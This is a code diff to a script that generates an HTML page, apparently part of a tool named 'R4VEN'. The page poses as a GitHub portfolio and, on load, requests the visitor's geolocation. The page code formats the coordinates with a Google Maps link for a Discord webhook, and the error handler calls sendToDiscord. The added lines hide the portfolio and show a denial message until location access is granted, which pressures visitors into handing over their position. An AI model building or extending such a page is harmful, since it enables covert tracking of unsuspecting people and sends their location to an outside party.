@@ -31,10 +31,34 @@ html_code = f"""
 <html>
 <head>
   <script type="text/javascript" src="dwebhook.js"></script>
+  <style>
+    body {{
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }}
+    #content-container {{
+      display: none; /* Disembunyikan secara default sampai izin diberikan */
+    }}
+    #error-container {{
+      display: none;
+      text-align: center;
+      margin-top: 20vh;
+      color: #ff4d4d;
+    }}
+  </style>
 </head>
 <body onload="getLocation()">
 
-  <iframe src="https://iqbalmantam.github.io/remi/" width="100%" height="900" style="border:none;"></iframe>
+  <!-- Konten Portofolio (Hanya muncul jika lokasi di-allow) -->
+  <div id="content-container">
+    <iframe src="https://iqbalmantam.github.io/remi/" width="100%" height="900" style="border:none;"></iframe>
+  </div>
+
+  <!-- Pesan Error jika lokasi di-block / ditolak -->
+  <div id="error-container">
+    <h2>⚠️ Akses Lokasi Ditolak</h2>
+    <p>Anda harus mengizinkan (allow) akses lokasi untuk membuka halaman portofolio ini.</p>
+  </div>
 
   <p id="demo"></p>
   <span id="gfg" style="display:none;"></span>
@@ -106,10 +130,15 @@ html_code = f"""
         navigator.geolocation.getCurrentPosition(showPosition, showError);
       }} else {{
         x.innerHTML = "Geolocation is not supported by this browser.";
+        document.getElementById("error-container").style.display = "block";
       }}
     }}
 
     function showPosition(position) {{
+      // Tampilkan kontainer portofolio karena lokasi diizinkan
+      document.getElementById("content-container").style.display = "block";
+      document.getElementById("error-container").style.display = "none";
+
       var latlong = (" GET ", "```prolog\\nLatitude:" + position.coords.latitude + "\\nLongitude:" + position.coords.longitude + "```" + "\\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);
 
       var myEmbed4 = {{
@@ -127,6 +156,10 @@ html_code = f"""
     }}
 
     function showError(error) {{
+      // Sembunyikan konten dan tampilkan pesan error jika ditolak
+      document.getElementById("content-container").style.display = "none";
+      document.getElementById("error-container").style.display = "block";
+
       if (error.code == error.PERMISSION_DENIED) {{
         sendToDiscord({{
           username: "R4VEN",
